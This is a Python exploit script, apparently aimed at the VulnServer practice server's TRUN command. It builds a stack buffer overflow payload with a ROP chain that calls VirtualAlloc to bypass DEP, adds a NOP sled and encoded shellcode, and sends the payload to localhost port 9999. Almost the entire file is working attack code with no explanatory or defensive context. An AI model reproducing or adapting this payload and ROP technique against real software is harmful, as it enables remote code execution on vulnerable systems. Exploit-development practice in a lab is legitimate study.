import socket, struct

def p32(x):
    return struct.pack("I", x)

#----------------------------------------#
# ROP Chain setup for VirtualAlloc()     #
#----------------------------------------#
# EAX = NOP (0x90909090)                 #
# ECX = flProtect (0x40)                 #
# EDX = flAllocationType (0x1000)        #
# EBX = dwSize                           #
# ESP = lpAddress (automatic)            #
# EBP = ReturnTo (ptr to jmp esp)        # 
# ESI = ptr to VirtualAlloc()            #
# EDI = ROP NOP (RETN)                   #
#----------------------------------------#


shellcode = (
"\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9"
"\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56"
"\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9"
"\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97"
"\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64"
"\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8"
"\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a"
"\x1c\x39\xbd" 
)

rop =  p32(0x71a55567) # POP EAX # RETN 0x00
rop += p32(0x71a51128) # kernel32!virtualalloc
rop += p32(0x77e82d04) # MOV EAX,DWORD PTR DS:[EAX] # RETN
rop += p32(0x77eb7401) # PUSH EAX # POP ESI # POP EBP # RETN 0x04
rop += p32(0x41414141) # compensate
rop += p32(0x77c4832b) # POP EBP # RETN
rop += p32(0x41414141) # compensate
rop += p32(0x625011af) # jmp esp # RETN
rop += p32(0x71a55567) # POP EAX # RETN 0x00
rop += p32(0xffffffc0) # NEG To 0x40
rop += p32(0x77dd9b16) # NEG EAX # RETN 
rop += p32(0x71ab9c2b) # XCHG EAX,ECX # RETN
rop += p32(0x71a55567) # POP EAX # RETN 0x00
rop += p32(0xffffefff) # inc to 0xfffff000, then NEG to 0xfff + 1 = 0x1000
rop += p32(0x77c1ce07) # INC EAX # RETN
rop += p32(0x77dd9b16) # NEG EAX # RETN
rop += p32(0x77c58fbc) # XCHG EAX,EDX # RETN
rop += p32(0x77c59f34) # POP EDI # RETN    
rop += p32(0x662b9d79) # RETN 
rop += p32(0x71a55567) # POP EAX # RETN 0x00
rop += p32(0xfffffdff) # NEG to 0x201
rop += p32(0x77dd9b16) # NEG EAX # RETN
rop += p32(0x77df563a) # XCHG EAX,EBX # RETN
rop += p32(0x71a55567) # POP EAX # RETN 0x00
rop += p32(0x90909090) # ROP
rop += p32(0x77f1cd9b) # PUSHAD # RETN 0x00

p = "TRUN ./"
p += "A" * 2005
p += rop
p += "\x90" * 36
p += shellcode
p += "C" * (2500-2005-len(shellcode)-36)

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1", 9999))
s.send(p)
